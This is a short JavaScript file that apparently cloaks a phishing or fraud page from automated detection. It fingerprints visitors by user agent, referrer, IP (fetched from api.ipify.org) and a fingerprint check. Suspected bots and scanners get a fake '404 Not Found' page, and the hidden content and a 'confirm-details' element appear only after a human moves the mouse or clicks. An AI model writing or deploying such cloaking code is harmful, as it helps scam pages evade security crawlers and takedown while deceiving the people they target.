async function checkBotAndReveal() {
  const ua = navigator.userAgent || "";
  const ref = document.referrer || "";
  let ip = null;

  try {
    const res = await fetch("https://api.ipify.org?format=json");
    const data = await res.json();
    ip = data.ip;
  } catch (e) {
    console.warn("IP fetch failed");
  }

  const uaFlag = Array.isArray(window.botUAs) && window.botUAs.some(b => ua.includes(b));
  const refFlag = Array.isArray(window.botRefs) && window.botRefs.some(r => ref.includes(r));
  const ipFlag = Array.isArray(window.botIPs) && window.botIPs.includes(ip);
  const fingerprintFlag = typeof isSuspiciousFingerprint === "function" && isSuspiciousFingerprint();

  console.log({ uaFlag, refFlag, ipFlag, fingerprintFlag });

  const isBot = uaFlag || refFlag || ipFlag || fingerprintFlag;

  if (isBot) {
    document.body.innerHTML = "<h1>404 Not Found</h1>";
  } else {
    window.addEventListener("mousemove", revealContent);
    window.addEventListener("click", revealContent);
  }
}

function revealContent() {
  const h1 = document.querySelector("h1");
  const content = document.getElementById("content");
  const confirm = document.getElementById("confirm-details");

  if (h1) h1.style.display = "none";
  if (content) content.style.display = "block";
  if (confirm) confirm.style.display = "block";

  window.removeEventListener("mousemove", revealContent);
  window.removeEventListener("click", revealContent);
}

setTimeout(checkBotAndReveal, 2500);
